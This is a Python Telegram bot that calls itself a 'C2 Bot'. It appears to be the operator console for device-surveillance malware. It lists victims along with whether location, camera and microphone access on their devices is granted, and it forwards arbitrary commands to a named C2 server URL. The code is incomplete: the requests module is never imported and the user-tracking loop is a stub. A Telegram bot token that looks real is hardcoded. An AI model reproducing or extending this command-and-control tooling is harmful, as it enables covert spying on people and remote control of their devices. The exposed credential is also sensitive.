import telebot
from threading import Thread
import time

# Initialize bot
bot = telebot.TeleBot("7526583138:AAH-mPmh54YgDIqn7cZO1AP8_3xlSPeDgn4")
c2_server_url = "https://workplacebd.github.io/C2-server-/"

# Store active users
active_users = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the C2 Bot! Use /list_users to see connected users.")

@bot.message_handler(commands=['list_users'])
def list_users(message):
    if not active_users:
        bot.reply_to(message, "No active users connected.")
        return
    
    response = "Connected users:\n"
    for user_id, info in active_users.items():
        response += f"\nUser ID: {user_id}\n"
        response += f"Permissions:\n"
        response += f"- Location: {'✅' if info['permissions'].get('location') else '❌'}\n"
        response += f"- Camera: {'✅' if info['permissions'].get('camera') else '❌'}\n"
        response += f"- Microphone: {'✅' if info['permissions'].get('microphone') else '❌'}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['send_command'])
def send_command(message):
    try:
        _, user_id, command = message.text.split(' ', 2)
        
        # Send command to C2 server
        response = requests.post(
            f"{c2_server_url}/send_command",
            json={"user_id": user_id, "command": command}
        )
        
        if response.json().get('status') == 'command queued':
            bot.reply_to(message, f"Command '{command}' sent to user {user_id}")
        else:
            bot.reply_to(message, "Failed to send command")
    
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}\nUsage: /send_command USER_ID COMMAND")

def update_user_list():
    """Periodically check for active users from C2 server"""
    while True:
        # In a real implementation, you would query the C2 server
        # for active users and update the active_users dictionary
        time.sleep(60)

if __name__ == '__main__':
    # Start the user list updater in a separate thread
    Thread(target=update_user_list).start()
    
    # Start the bot
    bot.polling()
